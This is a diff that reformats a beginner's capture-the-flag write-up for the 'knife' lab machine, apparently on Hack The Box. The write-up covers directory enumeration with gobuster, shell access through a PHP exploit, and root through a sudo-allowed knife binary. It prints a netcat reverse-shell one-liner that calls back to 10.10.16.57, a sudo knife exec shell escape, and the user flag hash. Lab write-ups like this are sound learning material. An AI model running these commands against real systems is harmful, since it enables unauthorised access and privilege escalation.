@@ -9,7 +9,7 @@ I navigated to the web server and was greeted by an apparent medical site for a 
 
 I was at a lost at what to do, so I did some googling and learned about gobuster. It's a package that attempts directory traversal through a wordlist. The exact command I used was: 
 
-                gobuster dir -u 10.10.10.242 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt
+        gobuster dir -u 10.10.10.242 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt
                 
 I found that /server-status was a valid directory, but I didn't have permissions to access it. Directory enumeration ended up to be a dead end.
 
@@ -20,7 +20,9 @@ I searched for exploits regarding that PHP version and came across this: https:/
 After running the code, I got a shell. I ran "id" and found that I was logged in as a user named "james". I ran the "ls" command and saw listed directories. I tried to navgate through the directories but that didn't work. However, other commands seemed to be working fine. I decided to use a reverse shell to see if that would allow me to traverse through directories.
 
 I looked at this website: https://pentestbook.six2dez.com/exploitation/reverse-shells for commands that can be used to create reverse shells. I used the first command underneath the bash section: 
-                rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.57 1337 >/tmp/f
+
+        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.57 1337 >/tmp/f
+        
 and generated a reverse shell.
 
 The reverse shell allowed me to navigate through the directories! I went to /home/james and saw a file called user.txt. That's the first flag: 17c3bb751e9961c0cbc0e1de916a4bd9
@@ -32,13 +34,13 @@ User james may run the following commands on knife:
 
 I ran knife -h to see what the available options were, but I didn't expect the help page to be so massive. A command that caught my eye was "knife exec". According to the knife documentation (https://docs.chef.io/workstation/knife_exec/), this command is able to run Ruby scripts. The syntax for running Ruby scripts is: 
 
-                knife exec -E 'RUBY CODE'
+        knife exec -E 'RUBY CODE'
 
 I tried to figure out how to use Ruby to elevate privileges, but was not able to grasp most of it. I am still very new to scripting! I decided to change tactics.
 
 I decided to go on gtfobins.github.io. This site is really nifty as it provides a massive amount of ways to use binaries to escalate priviliges. I searched up knife and found this code:
 
-                sudo knife exec -E 'exec "/bin/sh"'
+        sudo knife exec -E 'exec "/bin/sh"'
                 
 Since this knife binary is able to be run as sudo by james, this command makes it so that the sudo privileges are not dropped after running the command, essentially granting root access. 
 
